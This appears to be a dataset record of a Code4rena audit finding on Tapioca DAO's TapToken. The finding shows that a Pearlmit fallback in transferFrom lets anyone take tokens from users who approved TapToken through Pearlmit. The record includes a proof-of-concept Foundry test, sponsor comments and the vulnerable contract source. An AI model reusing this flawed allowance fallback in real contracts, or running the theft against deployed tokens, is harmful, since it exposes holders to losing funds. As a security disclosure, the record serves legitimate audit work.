{
  "Title": "[M-04] anyone with a `Pearlmit` approval to transfer `TapToken` can have their funds stolen",
  "Content": "\nWhen transferring `TapToken` there is an extra check done in [`BaseTapiocaOmnichainEngine::transferFrom`](https://github.com/Tapioca-DAO/tapioca-periph/blob/032396f701be935b04a7e5cf3cb40a0136259dbc/contracts/tapiocaOmnichainEngine/BaseTapiocaOmnichainEngine.sol#L63-L67):\n\n```solidity\nFile: tapioca-periph/contracts/tapiocaOmnichainEngine/BaseTapiocaOmnichainEngine.sol\n\n63:        if (allowance(from, spender) < value) {\n64:            // _transfer(from, to, value);\n65:            bool isErr = pearlmit.transferFromERC20(from, to, address(this), value);\n66:            if (isErr) revert BaseTapiocaOmnichainEngine_NotValid();\n67:        } else {\n```\n\nHere there's if the spender is not allowed, the allowance is checked in `Pearlmit`. The issue is that, `Pearlmit` checks the allowance against `msg.sender` which in this case will be the `TapToken` contract. Hence, any user with an allowance to the `TapToken` contract in `Pearlmit` can have their `TAP` stolen.\n\n### Impact\n\nIf a user has allowed `TapToken` to transfer `TapToken` through `Pearlmit`, they can have all they have approved stolen. Since `TapToken` does a lot of token handling in composed messages, this is likely to happen.\n\n### Proof of Concept\n\nTest in `tap-token/test/TapToken.t.sol`:\n\n```solidity\n    function testStealTapTokenUsingPearlmitAllowanceToTapToken() public {\n        deal(address(aTapOFT), userA, 1e18);\n        assertEq(aTapOFT.balanceOf(userA), 1e18);\n        assertEq(aTapOFT.balanceOf(userB), 0);\n\n        // userA allows TapToken to transfer TapTokens\n        vm.startPrank(userA);\n        pearlmit.approve(address(aTapOFT), 0, address(aTapOFT), 1e18, type(uint48).max);\n        aTapOFT.approve(address(pearlmit), 1e18);\n        vm.stopPrank();\n\n        // userB sees this and uses that allowance to transfer to themselves\n        vm.prank(userB);\n        aTapOFT.transferFrom(userA,userB, 1e18);\n        \n        assertEq(aTapOFT.balanceOf(userA), 0);\n        assertEq(aTapOFT.balanceOf(userB), 1e18);\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider not doing the fallback to `Pearlmit` in `transferFrom`.\n\n### Assessed type\n\nAccess Control\n\n**[cryptotechmaker (Tapioca) commented](https://github.com/code-423n4/2024-02-tapioca-findings/issues/172#issuecomment-2009720953):**\n > Low/Invalid; The issue seems a bit out of context. The link provided is from `BaseTapiocaOmnichainEngine` and there's no context provided from which part this is triggered on TapToken.\n> \n> Also this would be possible only if the approve in pearlmit is done with a large enough deadline and amount someone else can exploit. All pearlmit approvals have a deadline associated with them.\n\n**[0xRektora (Tapioca) confirmed and commented](https://github.com/code-423n4/2024-02-tapioca-findings/issues/172#issuecomment-2016878574):**\n > I'd keep it as medium. Potential side effects might happen on current/future TOE tokens.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-02-tapioca",
  "Code": [
    {
      "filename": "contracts/tapiocaOmnichainEngine/BaseTapiocaOmnichainEngine.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// LZ\nimport {IOAppMsgInspector} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/interfaces/IOAppMsgInspector.sol\";\nimport {SendParam, MessagingFee} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol\";\nimport {OFTMsgCodec} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/libs/OFTMsgCodec.sol\";\nimport {OAppSender} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OAppSender.sol\";\nimport {OFT} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/OFT.sol\";\n\n// External\nimport {SafeERC20, IERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {BytesLib} from \"solidity-bytes-utils/contracts/BytesLib.sol\";\n\n// Tapioca\nimport {ITapiocaOmnichainReceiveExtender} from \"tapioca-periph/interfaces/periph/ITapiocaOmnichainEngine.sol\";\nimport {TapiocaOmnichainExtExec} from \"./extension/TapiocaOmnichainExtExec.sol\";\nimport {PearlmitHandler, IPearlmit} from \"tapioca-periph/pearlmit/PearlmitHandler.sol\";\nimport {BaseToeMsgType} from \"./BaseToeMsgType.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\nabstract contract BaseTapiocaOmnichainEngine is OFT, PearlmitHandler, BaseToeMsgType {\n    using BytesLib for bytes;\n    using SafeERC20 for IERC20;\n    using OFTMsgCodec for bytes;\n    using OFTMsgCodec for bytes32;\n\n    /// @dev Used to execute certain extern calls from the TapToken contract, such as ERC20Permit approvals.\n    TapiocaOmnichainExtExec public toeExtExec;\n    /// @dev For future use, to extend the receive() operation.\n    ITapiocaOmnichainReceiveExtender public tapiocaOmnichainReceiveExtender;\n\n    error BaseTapiocaOmnichainEngine_NotValid();\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        address _endpoint,\n        address _delegate,\n        address _extExec,\n        IPearlmit _pearlmit\n    ) OFT(_name, _symbol, _endpoint, _delegate) PearlmitHandler(_pearlmit) {\n        toeExtExec = TapiocaOmnichainExtExec(_extExec);\n    }\n\n    /**\n     * @inheritdoc IERC20\n     * @dev Extended the capabilities to check allowance and transfer on Pearlmit.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual override returns (bool) {\n        address spender = _msgSender();\n        // If allowance on this contract is not met, try a transferFrom via Pearlmit.\n        if (allowance(from, spender) < value) {\n            // _transfer(from, to, value);\n            bool isErr = pearlmit.transferFromERC20(from, to, address(this), value);\n            if (isErr) revert BaseTapiocaOmnichainEngine_NotValid();\n        } else {\n            // If allowance on this contract is met, perform a normal transferFrom.\n            _spendAllowance(from, spender, value);\n            _transfer(from, to, value);\n        }\n\n        return true;\n    }\n\n    /**\n     * @inheritdoc OAppSender\n     * @dev Overwrite to check for < values.\n     */\n    function _payNative(uint256 _nativeFee) internal override returns (uint256 nativeFee) {\n        if (msg.value < _nativeFee) revert NotEnoughNative(msg.value);\n        return _nativeFee;\n    }\n\n    /**\n     * @dev Sets the `tapiocaOmnichainReceiveExtender` contract.\n     */\n    function setTapiocaOmnichainReceiveExtender(address _tapiocaOmnichainReceiveExtender) external onlyOwner {\n        tapiocaOmnichainReceiveExtender = ITapiocaOmnichainReceiveExtender(_tapiocaOmnichainReceiveExtender);\n    }\n\n    /**\n     * @dev public function to remove dust from the given local decimal amount.\n     * @param _amountLD The amount in local decimals.\n     * @return amountLD The amount after removing dust.\n     *\n     * @dev Prevents the loss of dust when moving amounts between chains with different decimals.\n     * @dev eg. uint(123) with a conversion rate of 100 becomes uint(100).\n     */\n    function removeDust(uint256 _amountLD) public view virtual returns (uint256 amountLD) {\n        return _removeDust(_amountLD);\n    }\n\n    /**\n     * @dev Slightly modified version of the OFT quoteSend() operation. Includes a `_msgType` parameter.\n     * The `_buildMsgAndOptionsByType()` appends the packet type to the message.\n     * @notice Provides a quote for the send() operation.\n     * @param _sendParam The parameters for the send() operation.\n     * @param _extraOptions Additional options supplied by the caller to be used in the LayerZero message.\n     * @param _payInLzToken Flag indicating whether the caller is paying in the LZ token.\n     * @param _composeMsg The composed message for the send() operation.\n     * @dev _oftCmd The OFT command to be executed.\n     * @return msgFee The calculated LayerZero messaging fee from the send() operation.\n     *\n     * @dev MessagingFee: LayerZero msg fee\n     *  - nativeFee: The native fee.\n     *  - lzTokenFee: The lzToken fee.\n     */\n    function quoteSendPacket(\n        SendParam calldata _sendParam,\n        bytes calldata _extraOptions,\n        bool _payInLzToken,\n        bytes calldata _composeMsg,\n        bytes calldata /*_oftCmd*/ // @dev unused in the default implementation.\n    ) external view virtual returns (MessagingFee memory msgFee) {\n        // @dev mock the amount to credit, this is the same operation used in the send().\n        // The quote is as similar as possible to the actual send() operation.\n        (, uint256 amountToCreditLD) = _debitView(_sendParam.amountLD, _sendParam.minAmountLD, _sendParam.dstEid);\n\n        // @dev Builds the options and OFT message to quote in the endpoint.\n        (bytes memory message, bytes memory options) =\n            _buildOFTMsgAndOptions(_sendParam, _extraOptions, _composeMsg, amountToCreditLD);\n\n        // @dev Calculates the LayerZero fee for the send() operation.\n        return _quote(_sendParam.dstEid, message, options, _payInLzToken);\n    }\n\n    /**\n     * @notice Build an OFT message and option. The message contain OFT related info such as the amount to credit and the recipient.\n     * It also contains the `_composeMsg`, which is 1 or more TAP specific messages. See `_buildTapMsgAndOptions()`.\n     * The option is an aggregation of the OFT message as well as the TAP messages.\n     *\n     * @param _sendParam: The parameters for the send operation.\n     *      - dstEid::uint32: Destination endpoint ID.\n     *      - to::bytes32: Recipient address.\n     *      - amountToSendLD::uint256: Amount to send in local decimals.\n     *      - minAmountToCreditLD::uint256: Minimum amount to credit in local decimals.\n     * @param _extraOptions Additional options for the send() operation. If `_composeMsg` not empty, the `_extraOptions` should also contain the aggregation of its options.\n     * @param _composeMsg The composed message for the send() operation. Is a combination of 1 or more TAP specific messages.\n     * @param _amountToCreditLD The amount to credit in local decimals.\n     *\n     * @return message The encoded message.\n     * @return options The combined LZ msgType + `_extraOptions` options.\n     */\n    function _buildOFTMsgAndOptions(\n        SendParam calldata _sendParam,\n        bytes calldata _extraOptions,\n        bytes calldata _composeMsg,\n        uint256 _amountToCreditLD\n    ) internal view returns (bytes memory message, bytes memory options) {\n        bool hasCompose;\n\n        // @dev This generated message has the msg.sender encoded into the payload so the remote knows who the caller is.\n        // @dev NOTE the returned message will append `msg.sender` only if the message is composed.\n        // If it's the case, it'll add the `address(msg.sender)` at the `amountToCredit` offset.\n        (message, hasCompose) = OFTMsgCodec.encode(\n            _sendParam.to,\n            _toSD(_amountToCreditLD),\n            // @dev Must be include a non empty bytes if you want to compose, EVEN if you don't need it on the remote.\n            // EVEN if you don't require an arbitrary payload to be sent... eg. '0x01'\n            _composeMsg\n        );\n        // @dev Change the msg type depending if its composed or not.\n        uint16 _msgType = hasCompose ? SEND_AND_CALL : SEND;\n        // @dev Combine the callers _extraOptions with the enforced options via the OAppOptionsType3.\n        options = combineOptions(_sendParam.dstEid, _msgType, _extraOptions);\n\n        // @dev Optionally inspect the message and options depending if the OApp owner has set a msg inspector.\n        // @dev If it fails inspection, needs to revert in the implementation. ie. does not rely on return boolean\n        if (msgInspector != address(0)) {\n            IOAppMsgInspector(msgInspector).inspect(message, options);\n        }\n    }\n\n    /**\n     * @dev Internal function to return the current EID.\n     */\n    function _getChainId() internal view virtual returns (uint32) {}\n}"
    }
  ]
}